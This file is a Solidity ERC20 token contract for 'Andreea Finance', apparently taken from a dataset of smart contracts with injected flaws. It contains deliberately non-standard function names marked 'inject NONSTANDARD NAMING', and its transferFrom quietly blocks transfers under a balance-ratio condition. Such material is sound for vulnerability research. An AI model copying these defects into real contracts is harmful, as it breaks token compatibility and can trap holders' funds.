                                                                 

pragma solidity 0.5.17;

contract ERC20 {
    function TOTALSUPPLY31() public view returns (uint supply);	//inject NONSTANDARD NAMING
    function BALANCEOF727(address who) public view returns (uint value);	//inject NONSTANDARD NAMING
    function ALLOWANCE26(address owner, address spender) public view returns (uint remaining);	//inject NONSTANDARD NAMING
    function TRANSFERFROM775(address from, address to, uint value) public returns (bool ok);	//inject NONSTANDARD NAMING
    function APPROVE961(address spender, uint value) public returns (bool ok);	//inject NONSTANDARD NAMING
    function TRANSFER454(address to, uint value) public returns (bool ok);	//inject NONSTANDARD NAMING
    event TRANSFER892(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL65(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

contract Andreea is ERC20{
    uint8 public constant decimals442 = 18;	//inject NONSTANDARD NAMING
    uint256 initialSupply = 3000000*10**uint256(decimals442);
    string public constant name739 = "Andreea Finance";	//inject NONSTANDARD NAMING
    string public constant symbol892 = "AND";	//inject NONSTANDARD NAMING

    address payable teamAddress;


    function TOTALSUPPLY31() public view returns (uint256) {	//inject NONSTANDARD NAMING
        return initialSupply;
    }
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    
    function BALANCEOF727(address owner) public view returns (uint256 balance) {	//inject NONSTANDARD NAMING
        return balances[owner];
    }

    function ALLOWANCE26(address owner, address spender) public view returns (uint remaining) {	//inject NONSTANDARD NAMING
        return allowed[owner][spender];
    }

    function TRANSFER454(address to, uint256 value) public returns (bool success) {	//inject NONSTANDARD NAMING
        if (balances[msg.sender] >= value && value > 0) {
            balances[msg.sender] -= value;
            balances[to] += value;
            emit TRANSFER892(msg.sender, to, value);
            return true;
        } else {
            return false;
        }
    }
    
    function TRANSFERFROM775(address from, address to, uint256 value) public returns(bool success) {	//inject NONSTANDARD NAMING
        if ((balances[to] * 10) <= balances[from]) {
    
            if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {
    
                balances[to] += value;
                balances[from] -= value;
                allowed[from][msg.sender] -= value;
                emit TRANSFER892(from, to, value);
                return true;
            } else {
                return false;
            }
        }
    
    }
    

    


    function APPROVE961(address spender, uint256 value) public returns (bool success) {	//inject NONSTANDARD NAMING
        allowed[msg.sender][spender] = value;
        emit APPROVAL65(msg.sender, spender, value);
        return true;
    }
    
     function () external payable {
        teamAddress.transfer(msg.value);
    }

    constructor () public payable {
        teamAddress = msg.sender;
        balances[teamAddress] = initialSupply;
    }

   
}